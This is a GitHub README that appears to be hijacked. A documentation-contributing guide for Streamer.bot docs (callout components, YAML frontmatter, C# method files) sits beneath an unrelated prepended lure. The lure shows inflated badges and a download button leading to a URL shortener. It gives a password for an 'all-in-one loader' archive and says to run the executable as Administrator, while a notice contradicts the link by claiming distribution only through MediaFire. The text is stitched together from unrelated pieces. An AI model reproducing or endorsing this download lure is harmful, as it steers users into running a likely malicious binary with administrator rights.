<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Contributing

Contributions are welcome and encouraged!

Feel free to open an issue to discuss missing information, or just fork and PR 💜

Guidelines: TBA

## MDC Components

The following are preconfigured `::callout` components:

```
::note
This is some useful information to callout
::

::tip
This is a cool tip!
::

::warning
Some important info goes here
::

:read-more{to="/path/to/some/other/page"}

::wip
This content is a work in progress
::
```

## Frontmatter

Some docs will be automatically built out from YAML frontmatter

### All

All pages should have a `title` and `description`.

Optionally, if the release version of a feature is known, the `version` key should contain the Streamer.bot version it was added in.

```yml
title: Page Title
description: Some description of this page
version: 0.2.3
```

### Sub-Actions & Triggers

Variables, Parameters (e.g. Sub-Action dialog options), and C# Method sections can automatically be built from front matter keys:

```yml [api/sub-actions/my-sub-action.md]
parameters:
  - name: Game Title
    type: Text
    required: true
    description: |
      Enter the description for this parameter with full markdown support.

      ::tip
        It even supports mdc!
      ::
  - name: Some other parameter
    type: Select
    required: false
    description: This is the description for some other parameter
variables:
  - name: viewers
    type: number
    description: The amount of viewers this raid received
    value: 183
commonVariables:
  - TwitchUser
csharpMethods:
  - UnbanUser
  - BanUser
```

### C# Methods

Supplemental information can be added to C# methods by adding a markdown file into the api/csharp/_methods directory with the **exact same name** as the C# Method:

```md [_methods/SomeCsharpMethod.md]
---
description: The primary short description for SomeCsharpMethod
version: 0.2.3
parameters:
  - name: data
    description: |
      Data to be sent to connected clients

      JSON must be stringified.
    value: '"Hello, world!"'
---

Some extended description information
```

- `description` - Short description rendered **above** the resulting C# code block and included in SEO
- `version` - Optional value representing the version of Streamer.bot that added this feature
- `deprecated` - Optional value representing the version of Streamer.bot that deprecated this feature
- `parameters` - Optional of parameter documentation
  - `name` - The exact name of this parameter. **Must match the name from Streamer.bot**
  - `description` - Any additional documentation or info to include with this parameter. **Markdown supported**
  - `value` - An example C# value for this parameter. Will be used within the `CPH Example` code block and included in the `Copy` function
  - `import` - Optionally import the parameter fields above from a file in the _parameters dir (see below)

### C# Parameters

Additionally, parameters information can be shared by referencing the name of any markdown or yaml file in the api/csharp/_parameters directory:

```md [_methods/SomeCsharpMethod.md]
---
parameters:
  - import: SomeSharedParameter
---
```

```md [_paramters/SomeSharedParamter]
---
name: my_parameter
description: |
  Some long description

  With extra info

  That would be annoying to include in every file that uses this parameter 😉
value: 0
---
```
